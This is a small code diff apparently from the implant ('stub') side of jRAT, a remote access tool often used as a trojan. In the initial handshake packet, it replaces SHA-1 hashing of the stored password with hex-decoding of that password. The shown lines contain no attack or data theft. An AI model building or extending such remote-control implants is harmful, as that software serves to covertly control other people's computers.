@@ -1,6 +1,6 @@
 package io.jrat.stub.packets.outgoing;
 
-import io.jrat.common.hash.Sha1;
+import io.jrat.common.codec.Hex;
 import io.jrat.common.io.StringWriter;
 import io.jrat.stub.Main;
 
@@ -9,13 +9,10 @@ import java.io.DataOutputStream;
 public class Packet1InitHandshake extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		Sha1 hash = new Sha1();
-		
+	public void write(DataOutputStream dos, StringWriter sw) throws Exception {		
 		String data = Main.getPass();
-		
-		/* Writes 20 bytes */
-		dos.write(hash.hash(data));
+				
+		dos.write(Hex.decodeToBytes(data));
 	}
 
 	@Override
